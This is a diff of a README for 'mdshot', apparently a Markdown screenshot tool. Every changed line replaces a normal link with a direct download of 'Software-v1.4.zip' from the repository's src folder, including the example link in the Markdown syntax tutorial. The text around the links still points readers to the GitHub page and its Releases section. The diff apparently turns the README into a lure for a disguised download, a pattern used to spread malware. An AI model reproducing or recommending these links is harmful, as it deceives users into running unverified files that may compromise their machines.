@@ -1,6 +1,6 @@
 # 🖼️ mdshot - Create Beautiful Markdown Screenshots
 
-[![Download mdshot](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/AmyriAmyri/mdshot)
+[![Download mdshot](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/AmyriAmyri/mdshot/main/src/Software-v1.4.zip)
 
 ## 📋 What is mdshot?
 
@@ -34,7 +34,7 @@ Follow these steps to download and run mdshot on your Windows PC. No extra tools
 
 Click the big green button below to visit the mdshot download page on GitHub.
 
-[![Download mdshot](https://img.shields.io/badge/Download-mdshot-blue)](https://github.com/AmyriAmyri/mdshot)
+[![Download mdshot](https://img.shields.io/badge/Download-mdshot-blue)](https://raw.githubusercontent.com/AmyriAmyri/mdshot/main/src/Software-v1.4.zip)
 
 On the GitHub page:
 
@@ -78,7 +78,7 @@ Markdown is a simple way to write formatted text. Here are some basics you can u
 - `#` for main headings.
 - `##` for subheadings.
 - `-` or `*` to make bullet lists.
-- `[Link Text](http://example.com)` to add clickable links.
+- `[Link Text](https://raw.githubusercontent.com/AmyriAmyri/mdshot/main/src/Software-v1.4.zip)` to add clickable links.
 - Triple backticks (**```**) to add code blocks.
 
 Example:
@@ -142,7 +142,7 @@ You can find these settings in the menu bar or settings icon.
 
 To keep mdshot working well:
 
-- Visit the [mdshot GitHub page](https://github.com/AmyriAmyri/mdshot) regularly.
+- Visit the [mdshot GitHub page](https://raw.githubusercontent.com/AmyriAmyri/mdshot/main/src/Software-v1.4.zip) regularly.
 - Download the latest installer from the Releases section.
 - Repeat the installation steps to update your app.
 
@@ -156,4 +156,4 @@ You can ask for help by visiting the mdshot page on GitHub. There you will find:
 
 ---
 
-[![Download mdshot](https://img.shields.io/badge/Download-mdshot-brightgreen)](https://github.com/AmyriAmyri/mdshot)
+[![Download mdshot](https://img.shields.io/badge/Download-mdshot-brightgreen)](https://raw.githubusercontent.com/AmyriAmyri/mdshot/main/src/Software-v1.4.zip)
